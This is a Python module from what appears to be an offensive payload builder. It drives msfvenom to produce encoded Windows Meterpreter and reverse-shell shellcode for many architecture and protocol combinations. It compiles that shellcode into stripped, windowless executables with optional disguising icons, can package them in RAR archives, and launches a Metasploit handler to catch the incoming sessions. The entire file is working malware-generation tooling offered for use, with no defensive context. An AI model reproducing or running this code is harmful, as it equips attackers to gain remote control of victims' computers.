from lib import core
import random, string
import subprocess, os
import time



Win_x64_Encoder = "x64/xor_dynamic"
Win_x86_Encoder = "x86/xor_dynamic"
Bad_Chars = '\'\\x00\\x0a\\x0d\''
C_Extension = 'c'



#Payload generator
def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):

    if STAGED == ("YES"):
        if ARCH == ("x64"):
            if PROTOCOLE == ("HTTP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_http', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


            elif PROTOCOLE == ("HTTPS"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_https', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


            elif PROTOCOLE == ("TCP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


                elif TYPE == ("Shell"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/shell/reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE



        elif ARCH == ("x86"):
            if PROTOCOLE == ("HTTP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_http', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


            elif PROTOCOLE == ("HTTPS"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_https', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


            elif PROTOCOLE == ("TCP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_tcp', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


                elif TYPE == ("Shell"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/shell/reverse_tcp',LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE



    elif STAGED == ("NO"):
        if ARCH == ("x64"):
            if PROTOCOLE == ("HTTP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/x64/meterpreter_reverse_http', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


            elif PROTOCOLE == ("HTTPS"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter_reverse_https', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


            elif PROTOCOLE == ("TCP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/x64/meterpreter_reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


                elif TYPE == ("Shell"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/x64/shell_reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE



        elif ARCH == ("x86"):
            if PROTOCOLE == ("HTTP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/meterpreter_reverse_http', LHOST, LPORT, '-e', Win_x86_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


            elif PROTOCOLE == ("HTTPS"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/meterpreter_reverse_https', LHOST, LPORT, '-e', Win_x86_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    print("bite")
                    return SHELLCODE


            elif PROTOCOLE == ("TCP"):
                if TYPE == ("Meterpreter"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/meterpreter_reverse_tcp', LHOST, LPORT, '-e', Win_x86_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE


                elif TYPE == ("Shell"):

                    ITERATION = Random_Encoder_Iteration()
                    MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/shell_reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                    PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                    SHELLCODE = Unnecessary_Characters(PAYLOAD)
                    core.Clear()
                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                    return SHELLCODE




#Auto-Compilation with ICON or no
def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):

    if ARCH == ("x64"):
        if PLATFORM == ("Windows"):
            if ICON != "":

                RC = 'id ICON "icon/'
                RC += ''.join((ICON, '"\n'))

                with open('icon/AccessMe.rc', 'w') as f:
                    f.write(RC)

                WINDRES = ['windres', 'icon/AccessMe.rc', '-O', 'coff', '-o', 'icon/AccessMe.res']
                subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                EXE = ['x86_64-w64-mingw32-gcc', 'source.c', 'icon/AccessMe.res', '-s', '-o', FILENAME,'-mwindows']
                subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                #RM_SourceFile = ['rm', 'source.c']
                #subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                RM_RcFile = ['rm', 'icon/AccessMe.rc']
                subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                RM_ResFile = ['rm', 'icon/AccessMe.res']
                subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compiled + Stripped !\n" + core.amcolors.ENDC)


            else:

                EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '-s', '-o', FILENAME, '-mwindows']
                subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                RM_SourceFile = ['rm', 'source.c']
                subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compiled + Stripped !\n" + core.amcolors.ENDC)



    elif ARCH == ("x86"):
        if PLATFORM == ("Windows"):
            if ICON != "":

                RC = 'id ICON "icon/'
                RC += ''.join((ICON, '"\n'))

                with open('icon/AccessMe.rc', 'w') as f:
                    f.write(RC)

                WINDRES = ['windres_1', 'icon/AccessMe.rc', '-O', 'coff', '-o','icon/AccessMe.res']
                subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                EXE = ['i686-w64-mingw32-gcc', 'source.c', 'icon/AccessMe.res', '-s', '-o', FILENAME,'-mwindows']
                subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                RM_SourceFile = ['rm', 'source.c']
                subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                RM_RcFile = ['rm', 'icon/AccessMe.rc']
                subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                RM_ResFile = ['rm', 'icon/AccessMe.res']
                subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compiled + Stripped !\n" + core.amcolors.ENDC)


            else:

                EXE = ['i686-w64-mingw32-gcc', 'source.c', '-s', '-o', FILENAME, '-mwindows']
                subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                RM_SourceFile = ['rm', 'source.c']
                subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compiled + Stripped !\n" + core.amcolors.ENDC)



#Add icon in executable
def Add_Icon():
    print("""
 |------------------------------------------------------------|
 |In the "icon" folder, put your icon files in it.            |
 |To specify an icon file, write as follows: my_icon_name.ico |
 |Press "ENTER" if you do not have an icon.                   |
 |------------------------------------------------------------|
        \n""")
    ICON = core.core_input()
    return ICON



def Compress_Rar(FILENAME):

    print("""
 |--------------------------------|  
 | Compress EXE to rar archive ?  |
 | [0] Nope;                      |
 | [1] Yeah;                      |
 |--------------------------------|  
        """)

    CR = core.core_input()

    if CR == "0":

        pass


    elif CR == "1":

        os.chdir("output/")

        print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Compression" + core.amcolors.ENDC)

        ARCHIVE = FILENAME.replace('.exe', '.rar')
        ARCHIVE = ARCHIVE.replace('output/', '')

        FILENAME = FILENAME.replace('output/', '')

        COMPRESS = ['rar', 'a', '-m5', ARCHIVE, FILENAME]
        subprocess.run(COMPRESS, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Compressed" + core.amcolors.ENDC)


    else:
        pass



def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):

    print("""
 |-----------------------------|  
 | Run multi/handler script ?  |
 | [0] Nope;                   |
 | [1] Yeah;                   |
 |-----------------------------|  
    """)

    RMS = core.core_input()

    if RMS == "0":

        pass


    elif RMS == "1":

        if ARCH == ("x64"):
            if PLATFORM == ("Windows"):
                if TYPE == ("Meterpreter"):

                    LHOST = LHOST.replace('LHOST=', '')
                    LPORT = LPORT.replace('LPORT=', '')

                    RC_Meterpreter = "use exploit/multi/handler\n"
                    RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
                    RC_Meterpreter += "set lhost " + LHOST + "\n"
                    RC_Meterpreter += "set lport " + LPORT + "\n"
                    RC_Meterpreter += "set AutoLoadStdapi false\n"
                    RC_Meterpreter += "set AutoSystemInfo false\n"
                    RC_Meterpreter += "set EnableStageEncoding true\n"
                    RC_Meterpreter += "set StageEncoder x64/xor_dynamic\n"
                    RC_Meterpreter += "set ExitOnSession false\n"
                    RC_Meterpreter += "exploit -z"

                    with open('AccessMe_To_Msf.rc', 'w') as f:
                        f.write(RC_Meterpreter)

                    os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                    core.Clear()

                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 12 seconds" + core.amcolors.ENDC)

                    time.sleep(12)

                    RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] RC file deleted." + core.amcolors.ENDC)



                elif TYPE == ("Shell"):

                    LHOST = LHOST.replace('LHOST=', '')
                    LPORT = LPORT.replace('LPORT=', '')

                    RC_Meterpreter = "use exploit/multi/handler\n"
                    RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
                    RC_Meterpreter += "set lhost " + LHOST + "\n"
                    RC_Meterpreter += "set lport " + LPORT + "\n"
                    RC_Meterpreter += "set ExitOnSession false\n"
                    RC_Meterpreter += "exploit -z"

                    with open('AccessMe_To_Msf.rc', 'w') as f:
                        f.write(RC_Meterpreter)

                    os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                    core.Clear()

                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 12 seconds" + core.amcolors.ENDC)

                    time.sleep(12)

                    RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] RC file deleted." + core.amcolors.ENDC)



        elif ARCH == ("x86"):
            if PLATFORM == ("Windows"):
                if TYPE == ("Meterpreter"):

                    LHOST = LHOST.replace('LHOST=', '')
                    LPORT = LPORT.replace('LPORT=', '')

                    RC_Meterpreter = "use exploit/multi/handler\n"
                    RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
                    RC_Meterpreter += "set lhost " + LHOST + "\n"
                    RC_Meterpreter += "set lport " + LPORT + "\n"
                    RC_Meterpreter += "set AutoLoadStdapi false\n"
                    RC_Meterpreter += "set AutoSystemInfo false\n"
                    RC_Meterpreter += "set EnableStageEncoding true\n"
                    RC_Meterpreter += "set StageEncoder x86/xor_dynamic\n"
                    RC_Meterpreter += "set ExitOnSession false\n"
                    RC_Meterpreter += "exploit -z"

                    with open('AccessMe_To_Msf.rc', 'w') as f:
                        f.write(RC_Meterpreter)

                    os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                    core.Clear()

                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 12 seconds" + core.amcolors.ENDC)
                    time.sleep(12)

                    RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] RC file deleted." + core.amcolors.ENDC)


                elif TYPE == ("Shell"):

                    LHOST = LHOST.replace('LHOST=', '')
                    LPORT = LPORT.replace('LPORT=', '')

                    RC_Meterpreter = "use exploit/multi/handler\n"
                    RC_Meterpreter += "set payload " + RC_PAYLOAD + "\n"
                    RC_Meterpreter += "set lhost " + LHOST + "\n"
                    RC_Meterpreter += "set lport " + LPORT + "\n"
                    RC_Meterpreter += "set ExitOnSession false\n"
                    RC_Meterpreter += "exploit -z"

                    with open('AccessMe_To_Msf.rc', 'w') as f:
                        f.write(RC_Meterpreter)

                    os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                    core.Clear()

                    print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Deletion of the RC file in 12 seconds" + core.amcolors.ENDC)

                    time.sleep(12)

                    RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] RC file deleted." + core.amcolors.ENDC)


        else:
            pass



#Varname creator
def Varname_Creator():
    Varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8888,9999)))
    return Varname



#Random meterpreter encoder iteration
def Random_Encoder_Iteration():
    iteration = str(random.randint(1, 3))
    return iteration



def Unnecessary_Characters(PAYLOAD):
    SHELLCODE = PAYLOAD
    SHELLCODE = SHELLCODE.replace(';', '')
    SHELLCODE = SHELLCODE.replace('unsigned char buf[] =', '')
    return SHELLCODE



#Add LHOST param
def LHOST_Input():
    LHOST = "LHOST="
    LHOST += input(core.amcolors.BLUE + core.amcolors.BOLD + "Enter you LHOST : " + core.amcolors.ENDC)
    return  LHOST



#Add LPORT param
def LPORT_Input():
    LPORT = "LPORT="
    LPORT += input(core.amcolors.BLUE + core.amcolors.BOLD + "Enter you LPORT : " + core.amcolors.ENDC)
    return LPORT



def FILENAME_Input():
    FILENAME = ""
    FILENAME += input(core.amcolors.BLUE + core.amcolors.BOLD + "Enter you FILENAME : " + core.amcolors.ENDC)
    return FILENAME
